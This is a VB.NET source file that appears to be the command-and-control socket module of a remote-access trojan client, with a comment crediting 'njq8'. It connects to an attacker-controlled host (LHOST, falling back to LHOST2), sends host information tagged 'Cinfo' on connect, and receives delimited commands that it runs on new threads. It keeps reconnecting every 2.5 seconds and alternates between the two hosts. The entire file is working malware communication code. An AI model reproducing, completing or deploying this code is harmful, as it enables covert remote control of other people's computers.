Public Class SK
    '#SK by njq8
    Public Shared SPLT As String = "|N|"
    Public Shared X As Net.Sockets.TcpClient

    Public Shared Sub Send(ByVal b As Byte())
        If CN = False Then Exit Sub
        Try
            Dim r As Object = New IO.MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(S2B(SPLT), 0, SPLT.Length)
            X.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
            r.Dispose()
        Catch ex As Exception
            CN = False
        End Try
    End Sub
    Public Shared Sub Send(ByVal S As String)
        Send(S2B(S))
    End Sub
    Public Shared CN As Boolean = False
    Public Shared Sub RC()
        Dim NMS As New IO.MemoryStream ' create memory stream
        Dim lp2 As Integer = 0
re:
        Try
            If X Is Nothing Then GoTo 1
            If X.Client.Connected = False Then GoTo 1
            If CN = False Then GoTo 1
            lp2 += 1
            If lp2 > 500 Then
                lp2 = 0
                ' check if i am still connected
                If X.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And X.Client.Available <= 0 Then GoTo 1
            End If
            If X.Available > 0 Then
                Dim B(X.Available - 1) As Byte
                X.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                NMS.Write(B, 0, B.Length)
rr:
                If B2S(NMS.ToArray).Contains(SPLT) Then ' split packet..
                    Dim A As Array = SB2W(NMS.ToArray, SPLT)
                    Dim T As New System.Threading.Thread(AddressOf CMD)
                    T.Start(A(0))
                    NMS.Dispose()
                    NMS = New IO.MemoryStream
                    If A.Length = 2 Then
                        NMS.Write(A(1), 0, A(1).length)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo 1
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re
1:      ' clear things and ReConnect
        CN = False
        Try
            X.Client.Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            NMS.Dispose()
        Catch ex As Exception
        End Try
        NMS = New IO.MemoryStream
        Try
            X = New Net.Sockets.TcpClient With {
                .ReceiveTimeout = -1,
                .SendTimeout = -1,
                .SendBufferSize = 999999,
                .ReceiveBufferSize = 999999
            }
            X.Client.SendBufferSize = 999999
            X.Client.ReceiveBufferSize = 999999
            lp2 = 0
            X.Client.Connect(ClientIP, LPORT)
            CN = True
            Send("Cinfo" & LKEY & Hello()) ' Send My INFO after connect
        Catch ex As Exception
            Threading.Thread.CurrentThread.Sleep(2500)
            If ClientIP = LHOST Then
                ClientIP = LHOST2
            Else
                ClientIP = LHOST
            End If

        End Try
        GoTo re


    End Sub
End Class